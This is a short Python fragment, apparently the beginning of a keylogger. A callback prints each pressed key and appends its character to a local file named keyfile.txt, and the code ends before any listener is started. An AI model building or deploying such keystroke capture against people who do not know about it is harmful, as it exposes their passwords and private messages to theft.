def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except Exception as e:
            print(f"Error getting char: {str(e)}")

keyboard_listener = None